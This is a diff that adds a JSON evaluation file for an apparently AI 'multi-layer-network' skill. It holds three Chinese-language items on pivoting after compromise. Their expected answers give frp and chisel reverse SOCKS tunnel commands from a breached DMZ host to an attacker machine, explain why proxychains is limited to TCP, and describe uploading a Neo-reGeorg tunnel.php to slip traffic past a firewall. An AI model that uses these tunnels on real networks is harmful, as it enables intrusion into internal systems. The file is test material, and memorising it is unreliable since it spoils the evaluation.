@@ -1,0 +1,59 @@
+{
+  "skill_name": "multi-layer-network",
+  "evals": [
+    {
+      "id": 1,
+      "name": "multilayer-frp-chisel-config",
+      "prompt": "你攻破了 DMZ 主机(公网IP + 内网 10.0.1.5)，需要建立 SOCKS5 代理访问内网 10.0.1.0/24。请分别写出用 frp 和 chisel 的具体配置/命令。",
+      "expected_output": "frp: 攻击机运行 frps(bind_port=7000), DMZ运行 frpc(server_addr=攻击机,plugin=socks5,remote_port=1080)。chisel: 攻击机 chisel server --reverse --port 8080, DMZ chisel client 攻击机:8080 R:socks",
+      "expectations": [
+        "frps|frpc|frp server|frp client|frp配置",
+        "chisel server|chisel client|反向|reverse",
+        "socks5|SOCKS代理|1080",
+        "bind_port|server_addr|端口配置",
+        "反向连接|从DMZ连出|穿越防火墙"
+      ],
+      "required_terms": [
+        "bind_port",
+        "server_addr",
+        "SOCKS代理"
+      ]
+    },
+    {
+      "id": 2,
+      "name": "multilayer-proxychains-tcp-limitation",
+      "prompt": "你通过 proxychains + SOCKS5 代理对内网扫描，发现 nmap -sU（UDP扫描）一直超时没结果，但 nmap -sT（TCP扫描）正常。为什么？",
+      "expected_output": "proxychains 只支持 TCP 协议，不支持 UDP。SOCKS5 代理的数据封装是基于 TCP 的，所以 UDP 扫描(-sU)、ICMP ping、SYN扫描(-sS)都不能通过 proxychains 使用",
+      "expectations": [
+        "proxychains|只支持TCP|TCP-only",
+        "UDP不支持|UDP扫描失败|-sU",
+        "SOCKS5|TCP封装|协议限制",
+        "-sT|全连接|TCP扫描|可用",
+        "ICMP|-sS|SYN|也不支持"
+      ],
+      "required_terms": [
+        "UDP不支持",
+        "SOCKS5",
+        "ICMP"
+      ]
+    },
+    {
+      "id": 3,
+      "name": "multilayer-neoregeorg-firewall-restricted",
+      "prompt": "内网环境防火墙极严格，只允许 80/443 出站，所有 SSH/反向 Shell 都无法建立。你如何建立隧道？",
+      "expected_output": "使用 Neo-reGeorg 建立 HTTP 隧道：上传 tunnel.php/aspx 到已攻破的 Web 服务器，通过 80/443 端口封装 SOCKS 流量。防火墙看到的是正常 HTTP 流量",
+      "expectations": [
+        "Neo-reGeorg|reGeorg|HTTP隧道",
+        "tunnel.php|tunnel.aspx|Web服务器|上传脚本",
+        "80|443|HTTP|HTTPS|正常流量",
+        "防火墙|只允许HTTP|绕过限制",
+        "SOCKS|封装|代理|穿透"
+      ],
+      "required_terms": [
+        "tunnel.php",
+        "Neo-reGeorg",
+        "reGeorg"
+      ]
+    }
+  ]
+}
